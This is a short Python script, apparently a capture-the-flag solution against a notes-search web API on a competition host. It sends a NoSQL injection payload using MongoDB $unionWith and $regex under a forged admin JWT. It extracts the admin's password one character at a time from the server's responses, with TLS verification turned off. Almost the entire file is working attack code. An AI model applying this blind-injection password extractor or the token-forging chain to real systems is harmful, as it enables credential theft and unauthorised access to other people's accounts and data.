import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()


# register -> jwt forge -> change username
username="admin"
password=""
u="https://bulbel.cbc2025.cloud/api/notes/search"
headers={'content-type': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OGJiMThmOWQ1MzFmNmU2OGEzZTg1NTciLCJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzU3MDkyMDg5LCJleHAiOjE3NTc2OTY4ODl9.u2J9bMhgMQrcrxKpGKGGa19fSQ-8IOOQN3ojPmbEkN4'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','"']:
            payload='''{
    "query": [
      {
        "$match": {
          "title": null
        }
      },
      {
        "$unionWith": {
          "coll": "users",
          "pipeline": [
            {
              "$match": {
                "username": "%s",
                "password": {"$regex": "^%s"}
              }
            }
          ]
        }
      }
    ]
  }''' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if "true" in r.text:
                print("Found one more char : %s" % (password+c))
                password += c